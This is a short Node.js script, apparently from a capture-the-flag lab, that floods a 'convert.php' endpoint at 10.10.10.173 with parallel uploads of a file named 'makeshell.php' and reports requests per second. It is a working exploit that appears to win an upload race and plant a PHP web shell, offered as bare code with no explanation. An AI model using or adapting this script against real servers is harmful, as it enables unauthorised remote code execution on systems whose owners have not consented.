const FormData = require('form-data');
const fs = require('fs');
const axios = require('axios');

const fileBuffer = fs.readFileSync(process.argv[2]);
const simultaneousRequests = process.argv[3] || 100;
let id = 0;
let requests = 0;

const doRequest = (callback) => {
    let formData = new FormData();
    formData.append('userfile', fileBuffer, {
        filename:    'makeshell.php',
        contentType: 'application/octet-stream',
    });
    formData.append('submit', 'Generate pdf');
    axios({
        method: 'POST',
        url: 'http://10.10.10.173/convert.php',
        data: formData,
        headers: formData.getHeaders()
    }).then((res) => {
        requests++;
        callback();
    }).catch(err => {
        console.error('Request Error', err.message);
    });
}

const handleFinishedRequest = () => {
    doRequest(handleFinishedRequest);
};

while(id++ < simultaneousRequests) {
    doRequest(handleFinishedRequest);
}

setInterval(() => {
    console.log('Requests per second ', requests);
    requests = 0;
}, 1000);